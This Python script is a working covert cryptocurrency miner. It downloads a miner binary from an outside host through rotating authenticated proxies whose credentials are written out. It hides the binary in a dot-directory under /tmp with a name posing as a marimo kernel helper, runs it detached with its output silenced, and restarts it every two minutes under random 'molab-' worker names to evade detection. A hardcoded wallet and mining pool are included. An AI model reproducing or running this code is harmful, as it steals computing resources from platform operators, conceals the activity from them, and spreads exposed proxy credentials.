import os
import subprocess
import time
import random
import signal

def get_proxy():
    proxies = [
        ("38.154.203.95", "5863", "wldrgzcc", "cw9bcb02n1qw"),
        ("198.105.121.200", "6462", "wldrgzcc", "cw9bcb02n1qw"),
        ("64.137.96.74", "6641", "wldrgzcc", "cw9bcb02n1qw"),
        ("209.127.138.10", "5784", "wldrgzcc", "cw9bcb02n1qw"),
        ("38.154.185.97", "6370", "wldrgzcc", "cw9bcb02n1qw"),
        ("84.247.60.125", "6095", "wldrgzcc", "cw9bcb02n1qw"),
        ("142.111.67.146", "5611", "wldrgzcc", "cw9bcb02n1qw"),
        ("191.96.254.138", "6185", "wldrgzcc", "cw9bcb02n1qw"),
        ("31.58.9.4", "6077", "wldrgzcc", "cw9bcb02n1qw"),
        ("104.239.107.47", "5699", "wldrgzcc", "cw9bcb02n1qw"),
    ]
    return random.choice(proxies)

def download_miner(binary_path):
    miner_url = "https://pearlhash.xyz/downloads/pearl-miner-v12"
    if not os.path.exists(binary_path):
        proxy_host, proxy_port, proxy_user, proxy_pass = get_proxy()
        proxy_env = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"
        ret = os.system(
            f"curl -s -x {proxy_env} -A 'Mozilla/5.0' "
            f"{miner_url} -o {binary_path}"
        )
        if ret != 0:
            os.system(f"wget -q {miner_url} -O {binary_path}")
        os.system(f"chmod +x {binary_path}")

def start_miner(binary_path, wallet, pool, worker):
    proxy_host, proxy_port, proxy_user, proxy_pass = get_proxy()
    cmd = (
        f"setsid nohup {binary_path} "
        f"--host {pool} "
        f"--user {wallet} "
        f"--worker {worker} "
        f"> /dev/null 2>&1 & echo $!"
    )
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    pid = result.stdout.strip()
    print(f"[+] Started | PID: {pid} | Proxy: {proxy_host}:{proxy_port}")
    return pid

def kill_miner(pid):
    try:
        if pid:
            os.kill(int(pid), signal.SIGKILL)
    except:
        os.system("pkill -f marimo-kernel-helper 2>/dev/null")

def main():
    hidden_dir = "/tmp/.marimo_runtime_cache_v4"
    fake_binary_name = "marimo-kernel-helper"
    binary_path = os.path.join(hidden_dir, fake_binary_name)
    wallet = "prl1p4c86af87x6xlyqynnk7gd9px3tdrq9uvck4c7hlfefd82cn2jp8qfw6gew"
    pool   = "pool.pearlhash.xyz:443"
    ROTATE_INTERVAL = 120

    if not os.path.exists(hidden_dir):
        os.makedirs(hidden_dir)

    download_miner(binary_path)
    print("[+] System ready.")

    current_pid = None
    while True:
        kill_miner(current_pid)
        time.sleep(2)
        worker = "molab-" + ''.join(random.choices('abcdefghijklmnop0123456789', k=6))
        current_pid = start_miner(binary_path, wallet, pool, worker)
        time.sleep(ROTATE_INTERVAL)

if __name__ == "__main__":
    main()
